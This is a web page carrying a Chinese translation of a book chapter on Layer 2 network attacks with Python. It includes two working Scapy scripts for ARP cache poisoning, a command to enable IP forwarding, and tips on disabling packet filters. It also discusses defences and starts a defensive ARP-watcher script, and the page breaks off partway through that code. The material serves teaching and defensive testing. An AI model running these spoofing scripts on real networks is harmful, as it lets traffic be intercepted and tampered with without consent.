<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns:wb="http://open.weibo.com/wb" xml:lang="en" lang="en">
<head>
    <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
    <meta name="viewport"
          content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no"/>
    <link rel="shortcut icon" href="http://bobao.360.cn/favicon.ico?v=1.1"/>
    <link rel="alternate" title="安全资讯" href="/rss?type=news" type="application/rss+xml"/>
    <link rel="alternate" title="安全知识" href="/rss?type=learning" type="application/rss+xml"/>
    <link rel="alternate" title="安全圈活动" href="/rss?type=activity" type="application/rss+xml"/>
    <link rel="alternate" title="所有漏洞" href="/rss?type=vul" type="application/rss+xml"/>
    <link rel="alternate" title="通用型漏洞" href="/rss?type=commonvul" type="application/rss+xml"/>
    <link rel="alternate" title="事件型漏洞" href="/rss?type=eventvul" type="application/rss+xml"/>
    <link rel="alternate" title="热门漏洞" href="/rss?type=hotvul" type="application/rss+xml"/>

        <title>Python网络攻防之第二层攻击 - 安全客 - 有思想的安全新媒体</title>
    
        <meta name="keywords" content="python,网络攻防,攻击"/>
    
        <meta name="description" content="本章节节选翻译自《Understanding Network Hacks: Attack and Defense with Python》中的第四章Layer 2 Attacks。该书通过网络层次划分介绍漏洞，并使用Python编写相关利用工具进行网络攻防，每小节均按照“原理--代码--解释--防御”的结构行文，此书也可与《Python黑帽子:黑客与渗透测试编程之道》相互参照学习，相信会达到较好的效果呦。"/>
        <meta property="wb:webmaster" content="224437c7be31d633"/>

    <script type="text/javascript" src="http://s7.qhimg.com/!56caa871/xpc_sync_height.js"></script>
    <link rel="stylesheet" type="text/css" href="/css/reset.css" />
    <link rel="stylesheet" type="text/css" href="/css/common_new.css?v=4.4.2.1" />
    <link rel="stylesheet" type="text/css" href="/css/jquery.notyfy.css" />
    <link rel="stylesheet" type="text/css" href="/css/notyfy.theme.default.css" />
    <link rel="stylesheet" type="text/css" href="/css/s_common.css?v=2.2.7" media="only screen and
    (max-device-width:900px), only screen and (max-width:900px)" />
    <script type="text/javascript" src="/js/jquery.min.js?v=3.1"></script>
    <script type="text/javascript" src="/js/jquery.notyfy.js"></script>
    <script type="text/javascript" src="/js/iscroll.js"></script>
    <script src="http://js.passport.qihucdn.com/5.0.3.js"></script>
    <script type="text/javascript">
        var myScroll, myNavScroll;

        function iscrollLoaded() {
            myScroll = new IScroll('#wrapper',
                {
                    scrollX: true,
                    scrollY: false,
                    bounceEasing: 'circular',
                    eventPassthrough: true,
                    preventDefault: false,
                    bounceTime: 500
                }
            );
        }

        $(function () {

            //导航横向滚动


            function setNavWidth() {

                /* 计算导航宽度 */
                var allWidth = $(window).width();
                var scroller = $('#scroller');

                if (allWidth > 900) {
                    scroller.find('ul').add(scroller.find('.scroll')).removeAttr('style');
                    scroller.css('overflow', 'visible');
                    if (myNavScroll) myNavScroll.destroy();
                } else {

                    var width = 0;
                    scroller.find('.scroll').children('ul').children('li').each(function (index, el) {
                        if (!$(this).hasClass('mobile-hide')) {
                            width += $(this).outerWidth();
                        }
                    });
                    scroller.find('ul').add(scroller.find('.scroll')).width(width);

                    if (myNavScroll) myNavScroll.destroy();

                    myNavScroll = new IScroll('#scroller', {
                        scrollX: true,
                        scrollY: false,
                        momentum: false,
                        click: true
                    });

                }

            }

            setNavWidth();
            $(window).resize(function (event) {
                setNavWidth();
            });

        });

    </script>
</head>
<body onload="iscrollLoaded();">
<div style='margin:0 auto;width:0px;height:0px;overflow:hidden;'>
    <img src=""/>
</div>

<div id="is-mobile"></div>
<div class="container">
        <div class="mobile-header">
        <div class="header clearfix">
            <div class="header-wrapper clearfix">
                <a href="/index/index" class="logo"><img class="slogan" src="/img/logo.png?v=1.5"/></a>
                                <form id="search" class="search-box" action="/search/index" method="GET">
                    <input class="keys" name="keywords" type="text" placeholder="搜索漏洞" required="required">
                    <input class="icon" type="submit" value="">
                    <input type="hidden" name="type" value=""/>
                </form>
                <div class="bug">
                    <div class="name"><span class="seled">全部</span><i class="arrow"></i></div>
                    <ul class="typelist">
                        <li data-index="3"><a href="javascript:void(0);">全部</a></li>
                        <li data-index="0"><a href="javascript:void(0);">漏洞</a></li>
                        <li data-index="1"><a href="javascript:void(0);">资讯</a></li>
                        <li data-index="2"><a href="javascript:void(0);">知识</a></li>
                    </ul>
                </div>
                                <div class="logNreg mobile-hide">
                    <div class="unlog">
                        <i></i>
                        <a href="log.html" class="log">登录</a>
                        <span>|</span>
                        <a href="reg.html" class="reg">注册</a>
                    </div>
                    <div class="loged">
                        <a href="/member/profile" class="user-center"><i></i><span class="user-name-tag">个人中心</span></a>
                        <div class="user-links">
                            <span class="arrow"></span>
                            <ul>
                                <li class="account-setting"><a href="http://i.360.cn/profile/accountmanage"
                                                               target="_blank"><i></i><span>账号设置</span></a></li>
                                <li class="alert-setting"><a href="/keywords/index"
                                                             target="_blank"><i></i><span>告警设置</span></a></li>
                                <li class="bug-alert"><a href="/myalarm/index" target="_blank"><i></i><span>漏洞告警</span></a>
                                </li>
                                <li class="my-knowl"><a href="/mylearn/index" target="_blank"><i></i><span>我的知识</span></a>
                                </li>
                                <li class="my-knowl"><a href="/mycourse/index" target="_blank"><i></i><span>我的课堂</span></a>
                                </li>
                                <li class="my-exit"><a
                                            href="http://login.360.cn/?src=pcw_adlab&op=logout&destUrl=http://bobao.360.cn"><i></i><span>退出系统</span></a>
                                </li>
                            </ul>
                        </div>

                        <a href="/message" class="message-center" target="_blank"><i></i><span>我的消息</span></a>
                        <div class="message-links">
                            <span class="arrow"></span>
                            <ul>
                                <li class="account-setting" style="display:none;"><a href="/myres/index"
                                                                                     target="_blank"><i></i><span>回复我的</span></a>
                                </li>
                                <li class="my-bug"><a href="/myvul/index"
                                                      target="_blank"><i></i><span>我的漏洞</span></a></li>
                                <!--<li class="my-bug"><a href="/myres/index" target="_blank"><i></i><span>我的评论</span></a></li>-->
                                <!--<li class="alert-setting"><a href="###" target="_blank"><i></i><span>提到我的</span></a>
                                </li>-->
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <style type="text/css">
            .nav {
                overflow: hidden;
            }

            .nav .scroll {
                width: auto;
            }
        </style>
        <div id="wrapper">
            <div id="scroller" class="nav">
                <div class="scroll">
                    <ul class="nav-list">
                        <li ><a class="link-nav"
                                                                                 href="/index/index">首页</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/vul/index">漏洞</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/introduce/list">招聘</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/news/index">资讯</a><!--<i class="arrow mobile-hide"></i>
                        <ul class="subnav-list mobile-hide">
                            <li><a class="link-subnav" href="/introduce/list">招聘</a></li>
                        </ul>
			-->
                        </li>
                        <li class="cur">
                        <a class="link-nav" href="/learning/index">知识</a><i class="arrow mobile-hide"></i>
                        <ul class="subnav-list mobile-hide">
                            <li><a class="link-subnav" href="/course/index">学院</a></li>
                        </ul>
                        </li>
                        <li ><a class="link-nav"
                                                               href="/activity/index">活动</a></li>
                        <li class="mobile-hide "><a class="link-nav"
                                                                                                   href="/ctf/index">CTF训练营</a>
                        </li>
                        <li ><a class="link-nav"
                                                               href="/interref/list">安全内参</a></li>
                        <li ><a class="link-nav" href="/app/index">APP</a></li>

                        <!--<li ><a href="/course/index">学院</a></li>-->
                        <!--<li ><a href="/introduce/list">招聘</a></li>-->
                        <!--<li  class="mobile-hide"><a href="/ctf/index">CTF训练营</a></li>-->
                    </ul>
                </div>
            </div>
        </div>
    </div>
    
    <div class="mobile-content">
        <link rel="stylesheet" type="text/css" href="/css/news.css?v=3.5" />
<link rel="stylesheet" type="text/css" href="/ue/SyntaxHighlighter/shCoreDefault.css?v=1.0" />
<style>
    p .syntaxhighlighter {
        width: 80%;
    }
</style>

<div class="cur-pos w1000">当前位置：<a href="http://bobao.360.cn/">安全客</a> &gt;&gt; 知识详情</div>

<div class="content clearfix">
    <div class="main">
        <div class="article">
            <div id="article_box">
                <h2>Python网络攻防之第二层攻击</h2>
                <div class="article-msg">
                    <span class="time">2015-09-15 11:22:05</span>
                    
                                        <span class="read">阅读：14790次</span>
                    <span><a style="display: none;" class="good" href="javascript:;"
                             data-target="/learning/good" data-value="g_662"
                             data-type="learning">点赞(0)</a></span>
                    <span><a class="fav" href="javascript:;" data-target="/mylearning/add"
                             data-pk="662" data-type="learning">收藏</a></span>
                                        <span><a style="margin-left: 4px;" class="fav" href="http://drops.wooyun.org/tips/8547"
                             target="_blank">来源： drops.wooyun.org</a></span>
                    
                    
                    <div style="margin-top:10px; ">
                        <a href="/member/contribute?uid=2515404038" style="color:#848e99;">
                            <img src="http://p1.qhmsg.com/dm/150_150_100/t00df551a583a87f4e9.jpg" data-is-avatar="true"
                                 style="border: 1px solid #d5d5d5;padding: 2px; width: 80px;height: 80px;border-radius: 43px;"/>
                        </a>

                    </div>
                    <span class="orig">作者：<a href="/member/contribute?uid=2515404038" style="color:#848e99;">Wooyun</a></span>
                                    </div>
                <hr size="1">
                <div class="article-msg">
                    <p><!-- JiaThis Button BEGIN -->

<!--
<span class="jiathis_style"><span class="jiathis_txt">分享到：</span>
	<a class="jiathis_button_weixin"></a>
	<a class="jiathis_button_tsina"></a>
    <a class="jiathis_button_tqq"></a>
    <a class="jiathis_button_qzone"></a>
    <a class="jiathis_button_renren"></a>
    <a class="jiathis_button_xiaoyou"></a>
    <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
</span>

-->
</p>
                </div>
                <p><p><span style="font-size: 14px; font-family: 微软雅黑,Microsoft YaHei;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;本章节节选翻译自《Understanding Network Hacks: Attack and Defense with Python》中的第四章Layer 2 Attacks。该书通过网络层次划分介绍漏洞，并使用Python编写相关利用工具进行网络攻防，每小节均按照“原理--代码--解释--防御”的结构行文，此书也可与《Python黑帽子:黑客与渗透测试编程之道》相互参照学习，相信会达到较好的效果呦。另译者水平有限，如有错误还请指正与海涵。<br/><strong><br/></strong></span></p><p><span style="font-size: 18px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><strong>0x00 摘要</strong></span></p><hr/><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="font-size: 14px; font-family: 微软雅黑,Microsoft YaHei;">在本章第二层攻击当中，我们将进入网络hacking的奇幻之旅。让我们回顾一下，第二层是负责在以太网中，使用MAC地址来发送数据包。除了ARP攻击，我们将探讨交换机是如何应对DOS攻击的，以及如何逃逸出VLAN环境。<br/><strong><br/></strong></span></p><p><span style="font-size: 14px; font-family: 微软雅黑,Microsoft YaHei;"><strong>0x01 需求模块</strong></span></p><hr/><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="font-size: 14px; font-family: 微软雅黑,Microsoft YaHei;">在Python中，你不必在意原始套接字或网络字节顺序，借由Philippe Biondi编写的Scapy，具有世界上最好的数据包生成器，你可以轻松地定制数据包。既不像在Libnet和C中那样需要指针运算，也不像在RawIP和Perl中，或者是在Scruby和Ruby中，你会被有限的几种协议所束缚。Scapy可以构造从ARP到IP/ICMP，再到TCP/UDP和DNS/DHCP等所有OSI层上的数据包，甚至是更不常见的协议也同样被支持，比如BOOTP, GPRS, PPPoE, SNMP, Radius, Infrared, L2CAP/HCI, EAP。<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;现在让我们在第二层网络上，使用Scapy来制造一些麻烦吧！首先你需要用如下的命令安装它：<br/></span><span style="font-size: 14px; font-family: 微软雅黑,Microsoft YaHei;"></span></p><pre class="brush:bash;toolbar:false">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pip&nbsp;install&nbsp;Scapy</pre><p><span style="font-size: 14px; font-family: 微软雅黑,Microsoft YaHei;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;现在你将步入经典著名的中间人攻击！<br/><strong><br/></strong></span></p><p><span style="font-size: 18px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><strong>0x02 ARP-Cache-Poisoning</strong></span></p><hr/><p><span style="font-size: 14px; font-family: 微软雅黑,Microsoft YaHei;">&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;&nbsp;如果一台主机想要发送IP数据包到另一台主机，就必须预先通过使用ARP协议请求目的MAC地址。这个询问会向网络中的所有成员广播。在一个完美的世界中，只有应答的主机是所需的目的主机。在一个不那么完美的世界中，攻击者会每隔几秒向它的受害者发送一个ARP应答报文，但是是以它自己的MAC地址作为响应，从而重定向该连接到其自身。因为大多数的操作系统都接受它们从未询问过的应答报文，所以该攻击才会生效！</span><br/></p><pre class="brush:python;toolbar:false">#!/usr/bin/python
import&nbsp;sys
import&nbsp;time
from&nbsp;scapy.all&nbsp;import&nbsp;sendp,&nbsp;ARP,&nbsp;Ether&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;
if&nbsp;len(sys.argv)&nbsp;&lt;&nbsp;3:
&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;sys.argv[0]&nbsp;+&nbsp;&quot;:&nbsp;&lt;target&gt;&nbsp;&lt;spoof_ip&gt;&quot;
&nbsp;&nbsp;&nbsp;&nbsp;sys.exit(1)&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;
iface&nbsp;=&nbsp;&quot;eth0&quot;
target_ip&nbsp;=&nbsp;sys.argv[1]
fake_ip&nbsp;=&nbsp;sys.argv[2]&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;
ethernet&nbsp;=&nbsp;Ether()
arp&nbsp;=&nbsp;ARP(pdst=target_ip,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;psrc=fake_ip,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;op=&quot;is-at&quot;)
packet&nbsp;=&nbsp;ethernet&nbsp;/&nbsp;arp&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;
while&nbsp;True:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sendp(packet,&nbsp;iface=iface)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;time.sleep(10)</pre><p><span style="font-size: 14px; font-family: 微软雅黑,Microsoft YaHei;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在Scapy的帮助下，我们构造了一个名为packet的数据包，里面包括一个Ethernet()及一个ARP()头。在ARP头部中，我们设置了受害者的IP地址（target_ip）和我们想劫持所有连接的IP地址（fake_ip）。对于最后一个参数，我们设置OP-Code为is-at，声明该数据包为一个ARP响应。然后sendp()函数在每次发送数据包时，都等待10秒并一直循环发送下去。<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;需要注意的是，你必须使用sendp()函数而不是send()函数，因为数据包应该在第二层被发送。send()则是在第三层发送数据包。<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最后，要记得启用IP转发，否则你的主机会阻塞来自受害者的连接。<br/></span></p><pre class="brush:bash;toolbar:false">sysctl&nbsp;net.ipv4.ip_forward=1</pre><p><span style="font-size: 14px; font-family: 微软雅黑,Microsoft YaHei;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;不要忘记检查像IPtables这样的数据包过滤器的设置，使用pf或ipfw或直接禁用它，现在已经了解了足够多的枯燥的理论知识，让我们直接进入一些实用的Python代码吧！<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果你只是用fake_ip来处理客户端的ARP缓存，那么你只会得到客户端的数据包，而无法接收到服务端的响应。如下图所示。<br/><img alt="http://p3.qhimg.com/t01c1a82e6c44707432.png" src="http://p3.qhimg.com/t01c1a82e6c44707432.png" title="t01c1a82e6c44707432.png"/><br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如下图所示，要强制通过攻击者的主机进行双向连接，攻击者就必须使用他的MAC地址，来伪造客户端和服务端的相关目的地址。<br/><br/><img alt="http://p7.qhimg.com/t0106d73defc9ca007f.png" src="http://p7.qhimg.com/t0106d73defc9ca007f.png" title="t0106d73defc9ca007f.png"/><br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我们的第一段代码有些粗糙，它发送了大量的ARP报文，不仅产生了所需要的流量，而且也比较暴露。隐蔽的攻击者会采取另一种策略。<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;一台主机如果想要获取有关IP地址的信息，会发出一个ARP请求。我们将编写一个程序，等待ARP请求，并为每一个接收到的请求发送一个ARP欺骗响应。在交换环境中，这将导致每一个连接都会流经攻击者的主机，因为在ARP缓存中，每一个IP地址都会有攻击者的MAC地址。这个攻击更加优雅，不像之前的那个那么嘈杂，但还是很容易被一个训练有素的管理员检测到。<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如下图所示，欺骗性的响应数据包和真实主机的响应数据包被并行发送。谁的数据包先被受害者的网卡接收到，则谁获胜。<br/><br/><img alt="http://p0.qhimg.com/t01d3dadbaa4dbd8b4d.png" src="http://p0.qhimg.com/t01d3dadbaa4dbd8b4d.png" title="t01d3dadbaa4dbd8b4d.png"/>&nbsp;&nbsp; &nbsp;<br/></span><span style="font-size: 14px; font-family: 微软雅黑,Microsoft YaHei;"></span><br/></p><pre class="brush:python;toolbar:false">#!/usr/bin/python&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;
import&nbsp;sys
from&nbsp;scapy.all&nbsp;import&nbsp;sniff,&nbsp;sendp,&nbsp;ARP,&nbsp;Ether&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;
if&nbsp;len(sys.argv)&nbsp;&lt;&nbsp;2:
&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;sys.argv[0]&nbsp;+&nbsp;&quot;&nbsp;&lt;iface&gt;&quot;
&nbsp;&nbsp;&nbsp;&nbsp;sys.exit(0)&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;
&nbsp;
def&nbsp;arp_poison_callback(packet):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Got&nbsp;ARP&nbsp;request?
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;packet[ARP].op&nbsp;==&nbsp;1:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;answer&nbsp;=&nbsp;Ether(dst=packet[ARP].hwsrc)&nbsp;/&nbsp;ARP()
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;answer[ARP].op&nbsp;=&nbsp;&quot;is-at&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;answer[ARP].hwdst&nbsp;=&nbsp;packet[ARP].hwsrc
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;answer[ARP].psrc&nbsp;=&nbsp;packet[ARP].pdst
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;answer[ARP].pdst&nbsp;=&nbsp;packet[ARP].psrc&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;Fooling&nbsp;&quot;&nbsp;+&nbsp;packet[ARP].psrc&nbsp;+&nbsp;&quot;&nbsp;that&nbsp;&quot;&nbsp;+&nbsp;\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;packet[ARP].pdst&nbsp;+&nbsp;&quot;&nbsp;is&nbsp;me&quot;&nbsp;&nbsp;&nbsp;
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sendp(answer,&nbsp;iface=sys.argv[1])&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;
sniff(prn=arp_poison_callback,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;filter=&quot;arp&quot;,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;iface=sys.argv[1],
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;store=0)</pre><p><span style="font-size: 14px; font-family: 微软雅黑,Microsoft YaHei;"><br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;从参数iface指定的网卡中，sniff()函数无限循环地读取数据包。将PACP过滤器设置为arp，使接收到的数据包都被自动过滤，来保证我们的回调函数arp_poison_callback在被调用时，只有ARP数据包作为输入。同时由于参数store=0，数据包将不会被存储。<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;arp_poison_callback()函数处理我们的实际工作。首先，它会检查ARP报文的OP code：当它是1时则为一个ARP请求，然后我们来生成一个响应包，在响应数据包中，我们将请求包中的源MAC地址和IP地址作为目的MAC地址和IP地址。因为我们未定义源MAC地址，所以Scapy会自动插入发送数据包的网络接口地址。<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ARP中IP与MAC地址的对应关系会被缓存一段时间，因为它会被转储起来，对同一地址一遍又一遍地进行解析。可以用如下命令显示ARP缓存：<br/></span><span style="font-size: 14px; font-family: 微软雅黑,Microsoft YaHei;"></span></p><pre class="brush:bash;toolbar:false">arp&nbsp;-an
?&nbsp;(192.168.13.5)&nbsp;at&nbsp;c0:de:de:ad:be:ef&nbsp;[ether]&nbsp;on&nbsp;eth0</pre><p><span style="font-size: 14px; font-family: 微软雅黑,Microsoft YaHei;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这依赖于操作系统和它的版本，本地配置设置及地址被缓存的时间。<br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;为了抵御ARP欺骗攻击，一方面可以使用ARP静态表，但是这同样可以被接收到的ARP响应所覆盖，这些均依赖于操作系统对ARP的处理代码。另一方面也可以使用像ARP watcher这样的工具。ARP watcher监控ARP流量，并报告可疑行为但并不阻止。现在最先进的入侵检测系统可以检测到ARP缓存中毒攻击。你应该使用上面的代码，检查一下你的IDS，看看它是如何表现的。<br/><strong><br/></strong></span></p><p><span style="font-size: 18px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><strong>0x03 ARP-Watcher</strong></span></p><hr/><p><span style="font-size: 14px; font-family: 微软雅黑,Microsoft YaHei;">接下来我们编写一个小工具，来报告所有新连接到我们网络的设备，为此它必须能够记住所有IP和MAC地址的对应关系。此外，它还可以检测出一个网络设备是否突然更改了它的MAC地址。</span><br/></p><pre class="brush:python;toolbar:false">#!/usr/bin/python&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;
from&nbsp;scapy.all&nbsp;import&nbsp;sniff,&nbsp;ARP
from&nbsp;signal&nbsp;import&nbsp;signal,&nbsp;SIGINT
import&nbsp;sys&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;
arp_watcher_db_file&nbsp;=&nbsp;&quot;/var/cache/arp-watcher.db&quot;
ip_mac&nbsp;=&nbsp;{}&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;
#&nbsp;Save&nbsp;ARP&nbsp;table&nbsp;on&nbsp;shutdown
def&nbsp;sig_int_handler(signum,&nbsp;frame):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;Got&nbsp;SIGINT.&nbsp;Saving&nbsp;ARP&nbsp;database...&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;f&nbsp;=&nbsp;open(arp_watcher_db_file,&nbsp;&quot;w&quot;)&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;(ip,&nbsp;mac)&nbsp;in&nbsp;ip_mac.items():
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;f.write(ip&nbsp;+&nbsp;&quot;&nbsp;&quot;&nbsp;+&nbsp;mac&nbsp;+&nbsp;&quot;\n&quot;)&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;f.close()
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;Done.&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;except&nbsp;IOError:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;Cannot&nbsp;write&nbsp;file&nbsp;&quot;&nbsp;+&nbsp;arp_watcher_db_file
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sys.exit(1)&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;
&nbsp;
def&nbsp;watch_arp(pkt):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;got&nbsp;is-at&nbsp;pkt&nbsp;(ARP&nbsp;response)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;pkt[ARP].op&nbsp;==&nbsp;2:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;pkt[ARP].hwsrc&nbsp;+&nbsp;&quot;&nbsp;&quot;&nbsp;+&nbsp;pkt[ARP].psrc&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Device&nbsp;is&nbsp;new.&nbsp;Remember&nbsp;it.
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;ip_mac.get(pkt[ARP].psrc)&nbsp;==&nbsp;None:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;Found&nbsp;new&nbsp;device&nbsp;&quot;&nbsp;+&nbsp;\
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pkt[ARP].hwsrc&nbsp;+&nbsp;&quot;&nbsp;&quot;&nbsp;+&nbsp;\
